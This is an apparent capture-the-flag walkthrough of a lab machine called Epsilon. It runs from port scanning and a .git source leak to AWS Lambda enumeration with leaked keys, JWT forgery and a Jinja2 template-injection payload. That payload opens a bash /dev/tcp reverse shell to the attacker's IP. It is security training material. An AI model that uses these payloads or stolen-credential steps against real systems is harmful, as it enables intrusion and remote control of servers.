

![](2022-06-30-08-52-35.png)
- Skills: Git Source Leak Exploit (GitHack) AWS Enumeration Lambda Function Enumeration Authentication Bypass Abusing JWT Server Side Template Injection (SSTI) Tar Symlink Exploitation
- Style: eWPT eWPTXv2 OSCP OSWE

# Fase de reconocomiento

iPmachine --> 10.10.11.134
Ip --> 10.10.14.9

## Ping to machine
![](2022-06-30-08-54-44.png)

We are conected

## Nmap for view open ports

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.134 -oG allports

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

```

## Nmap view services port
```bash
nmap -sCV -p80,22,5000 10.10.11.134 -oN Targeted
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## whatweb for ip:port
i dont use ssh in this case, in htb usually use ssh to connect more late.

```bash
❯ whatweb 10.10.11.134
http://10.10.11.134 [403 Forbidden] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.134], Title[403 Forbidden]
❯ whatweb 10.10.11.134:5000
http://10.10.11.134:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.134], PasswordField[password], Python[3.8.10], Script, Title[Costume Shop], Werkzeug[2.0.2]
```
## What its werkzeug/2.0.2 python /3.8.10

i need know more about werkzeug , whatweb show its httpserver in html5 with python3.8.10 tecnology
>Werkzeug is a comprehensive WSGI web application library. It began as a simple collection of various utilities for WSGI applications and has become one of the most advanced WSGI utility libraries.

Explore 
![](2022-06-30-09-04-15.png)

nothing in the web code.

## fuzzing web

in this case i will realiyze fuzzing for urls and subdomains. I use wfuzz and ferobuxter

```bash

nmap --script http-enum -p80,5000 10.10.11.134 -oN webScan
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 09:09 CEST
Nmap scan report for 10.10.11.134
Host is up (0.051s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|_  **/.git/HEAD: Git folder**
5000/tcp open  upnp


feroxbuster -u http://10.10.11.134:5000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.134:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      205l      358w     3550c http://10.10.11.134:5000/
302      GET        4l       24w      208c http://10.10.11.134:5000/home => http://10.10.11.134:5000/
302      GET        4l       24w      208c http://10.10.11.134:5000/order => http://10.10.11.134:5000/
200      GET      234l      454w     4288c http://10.10.11.134:5000/track
```
![](2022-06-30-09-14-00.png)

In the code 
```js
 <script>
  window.console = window.console || function(t) {};
</script>
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
```

i try with wfuzz
```bash
wfuzz -c --hc=404 -t 200 -w /home/riskoo/Riskoo/maquinas/diccionarios/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 10.10.11.134:5000/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.134:5000/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000000003:   200        204 L    358 W      3550 Ch     "# Copyright 2007 James Fisher"                                                                      
000000006:   200        204 L    358 W      3550 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                      
000000009:   200        204 L    358 W      3550 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                
000000008:   200        204 L    358 W      3550 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                         
000000005:   200        204 L    358 W      3550 Ch     "# This work is licensed under the Creative Commons"                                                 
000000004:   200        204 L    358 W      3550 Ch     "#"                                                                                                  
000000010:   200        204 L    358 W      3550 Ch     "#"                                                                                                  
000000011:   200        204 L    358 W      3550 Ch     "# Priority ordered case-sensitive list, where entries were found"                                   
000000038:   302        3 L      24 W       208 Ch      "home"                                                                                               
000000007:   200        204 L    358 W      3550 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                    
000000001:   200        204 L    358 W      3550 Ch     "# directory-list-2.3-medium.txt"                                                                    
000000014:   200        204 L    358 W      3550 Ch     "http://10.10.11.134:5000/"                                                                          
000000013:   200        204 L    358 W      3550 Ch     "#"                                                                                                  
000000002:   200        204 L    358 W      3550 Ch     "#"                                                                                                  
000000012:   200        204 L    358 W      3550 Ch     "# on at least 2 different hosts"                                                                    
000000322:   302        3 L      24 W       208 Ch      "order"                                                                                              
000000914:   200        233 L    454 W      4288 Ch     "track"  
``` 

Vamos a investigar el git con gitdumper de gittools

```bash
https://github.com/joseluisinigo/GitTools

git clone https://github.com/joseluisinigo/GitTools

gitdumper.sh http://10.10.11.134/.git/ .

ls -la
drwxr-xr-x riskoo riskoo     4 KB Thu Jun 30 11:04:28 2022  .
drwxr-xr-x riskoo riskoo     4 KB Thu Jun 30 08:42:55 2022  ..
drwxr-xr-x riskoo riskoo     4 KB Thu Jun 30 11:04:37 2022  .git


git log


commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -> master)
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000



git show c622771686bd74c16ece91193d29f85b5f9ffa91

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index 545f6fe..8d3b52e 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -8,8 +8,8 @@ session = Session(
     aws_access_key_id='<aws_access_key_id>',
     aws_secret_access_key='<aws_secret_access_key>',
     region_name='us-east-1',
-    endpoint_url='http://cloud.epsilong.htb')
-aws_lambda = session.client('lambda')    
+    endpoint_url='http://cloud.epsilon.htb')
+aws_lambda = session.client('lambda')


--- 
git show b10dd06d56ac760efbbb5d254ea43bf9beb56d2d


commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

diff --git a/server.py b/server.py
new file mode 100644
index 0000000..dfdfa17
--- /dev/null
+++ b/server.py
@@ -0,0 +1,65 @@

```

```python
+#!/usr/bin/python3
+
+import jwt
+from flask import *
+
+app = Flask(__name__)
+secret = '<secret_key>'
+
+def verify_jwt(token,key):
+       try:
+               username=jwt.decode(token,key,algorithms=['HS256',])['username']
+               if username:
+                       return True
+               else:
+                       return False
+       except:
+               return False
+
+@app.route("/", methods=["GET","POST"])
+def index():
+       if request.method=="POST":
+               if request.form['username']=="admin" and request.form['password']=="admin":
+                       res = make_response()
+                       username=request.form['username']
+                       token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+                       res.set_cookie("auth",token)
+                       res.headers['location']='/home'
+                       return res,302
+               else:
+                       return render_template('index.html')
+       else:
+               return render_template('index.html')
+
+@app.route("/home")
+def home():
+       if verify_jwt(request.cookies.get('auth'),secret):
+               return render_template('home.html')
+       else:
+               return redirect('/',code=302)
+
+@app.route("/track",methods=["GET","POST"])
+def track():
+       if request.method=="POST":
+               if verify_jwt(request.cookies.get('auth'),secret):
+                       return render_template('track.html',message=True)
+               else:
+                       return redirect('/',code=302)
+       else:
+               return render_template('track.html')
+
+@app.route('/order',methods=["GET","POST"])
+def order():
+       if verify_jwt(request.cookies.get('auth'),secret):
+               if request.method=="POST":
+                       costume=request.form["costume"]
+                       message = '''
+                       Your order of "{}" has been placed successfully.
+                       '''.format(costume)
+                       tmpl=render_template_string(message,costume=costume)
+                       return render_template('order.html',message=tmpl)
+               else:
+                       return render_template('order.html')
+       else:
+               return redirect('/',code=302)
+app.run(debug='true')

```

```bash
git show c51441640fd25e9fba42725147595b5918eba0f1
commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index fed7ab9..545f6fe 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -5,8 +5,8 @@ from boto3.session import Session
 
 
 session = Session(
-    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
-    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    aws_access_key_id='<aws_access_key_id>',
+    aws_secret_access_key='<aws_secret_access_key>',
     region_name='us-east-1',
     endpoint_url='http://cloud.epsilong.htb')
 aws_lambda = session.client('lambda')    


```


```bash
import io
+import os
+from zipfile import ZipFile
+from boto3.session import Session
+
+
+session = Session(
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    region_name='us-east-1',
+    endpoint_url='http://cloud.epsilong.htb')
+aws_lambda = session.client('lambda')    
+
+
+def files_to_zip(path):
+    for root, dirs, files in os.walk(path):
+        for f in files:
+            full_path = os.path.join(root, f)
+            archive_name = full_path[len(path) + len(os.sep):]
+            yield full_path, archive_name
+
+
+def make_zip_file_bytes(path):
+    buf = io.BytesIO()
+    with ZipFile(buf, 'w') as z:
+        for full_path, archive_name in files_to_zip(path=path):
+            z.write(full_path, archive_name)
+    return buf.getvalue()
+
+
+def update_lambda(lambda_name, lambda_code_path):
+    if not os.path.isdir(lambda_code_path):
+        raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path))
+    aws_lambda.update_function_code(
+        FunctionName=lambda_name,
+        ZipFile=make_zip_file_bytes(path=lambda_code_path))

```

He apuntado en el archivo evidencias.md algunas cosas que me han percido interesantes de estos códigos.

Vamos a usar el programa **awscli** ya que tenemos el vhost cloud.epsilon.htb que tendremos que añadir a /etc/vhosts

Awscli es para crear servidor de aws . Como vimos en las evidencias básicamente nos están dando las credenciales desde el log de git.

[Github Awascli Forked](https://github.com/joseluisinigo/aws-cli)

![](2022-06-30-11-57-50.png)

En las evidencias vimos
```bash

aws_access_key_id='AQLA5M37BDN6FJP76TDC',
aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
endpoint_url='http://cloud.epsilong.htb')
client('lambda')  
region_name='us-east-1',
endpoint_url='http://cloud.epsilong.htb')
-aws_lambda = session.client('lambda')    
+    endpoint_url='http://cloud.epsilon.htb')
+aws_lambda = session.client('lambda')
```

Según el readme de awscli hay que configurar previamente y ahí podremos meter estos datos

```bash
aws configure


AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]: 
```

Una vez configurado vamos a lanzar para ver la lista de procesos con endpoint_url http://cloud.epsilon.htb  (recordar que debe de estar /etc/host el cloud.epsilon.htb)

```bash
aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2022-06-30T06:51:34.083+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "01728ab1-232d-4d11-87dd-29315a83fdc2",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

Apuntamos en evidencias el 

"CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=" 
"Role": "arn:aws:iam::123456789012:role/service-role/dev" y function:costume_shop_v1",

Vamos ahora a ver la funcion costume_shop_v1 entiendo que tendrá dentro un zip porque pone algo de packagetype

```bash
aws lambda get-function --function-name=costume_shop_v1 --endpoint-url http://cloud.epsilon.htb
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2022-06-30T06:51:34.083+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "01728ab1-232d-4d11-87dd-29315a83fdc2",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}
```

Si le damos a http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code nos baja un archivo. Lo voy a decargar dentro de mis evidencias

wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
unzip code.zip

Una vez que tenemos el secret podemos crear el jwt. Creo que con jwt.encode primero será suficiente pero voy a probar con admin porque lo vi en alguna parte de las evidencias.

```python
python3
Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> secret = "RrXCv`mrNe!K!4+5`wYq"
>>> jwt.encode({"username":"0xdf"},secret, algorithm='HS256')
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjB4ZGYifQ.0kQYuCxPdN6bYT66kYg3lF-fjFRU9YvI30hNN4t77RE'
>>> jwt.encode({"username":"admin"},secret, algorithm='HS256')
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg'
>>> jwt.encode({"username":"admin", "password":"admin"},secret, algorithm='HS256')
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.epQK9DdQ_jLPM7pFZ2AJLfsv4LbS-F9FxWvL6VIoWRY'
```
vimos lo de admin como nombre aquí:

![](2022-06-30-12-39-49.png)

Ahora vamos a ir a burpsuite a poner el auth a ver que pasa... ¿Por qué auth? 

![](2022-06-30-12-41-00.png)

## modificar una cookie con los valores que necesitamos

En firefox
1. vamos a firefox cambiamos las cookies como aparece en la imagen y tener en cuenta que la url es /home

![](2022-06-30-12-56-34.png)

2. en chrome

![](2022-06-30-13-23-28.png)

3. En burpsuite habría que mandar en la petición de esta forma
```bash
#la url tiene que ser /home
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg
```

He estado explorando las url y capturándolas. Así a simple vista petición al servidor y con parámetros nos encontramos cuando hacemos un pedido.

Como hemos visto se trata de python por detrás por lo cual vamos a buscar payloads para poner en los datos de la petición.

### Jinja2 - Basic injection

```python
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```

Además he visto que puedo cambiar los valores por cuentas y aunque algunas dan problemas de servidor , otras me lo hacen

![](2022-06-30-18-55-46.png)

Estupendo parece que es vulnerable a jinja2 para python, voy a buscar payloads y a ir probando algunos desde repeater de burpsuite a ver que conseguimos. Lo ideal es conseguir una revert shell por lo que tendremos que ponernos en escucha, pero bueno, no adelantemos acontecimientos.

#### Exploit the SSTI by calling os.popen().read()

These payloads are context-free, and do not require anything, except being in a jinja2 Template object:

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}

{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

Pues realmente una vez localizado los payloads no he tenido que probar mucho

![](2022-06-30-19-16-13.png)

Voy a mandar poniendo la revertshell

La revert shell sería esta 

```bash
#antes me pongo en escucha en otra terminal

nc -lnvp 443

bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1
```

costume={{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1"').read() }}&q=1&addr=1

![](2022-06-30-19-22-23.png)

Entiendo que como tiene parámetros con &... debo de convertirlos, sino probaré luego con base64 etc diferentes modos.
& --> %24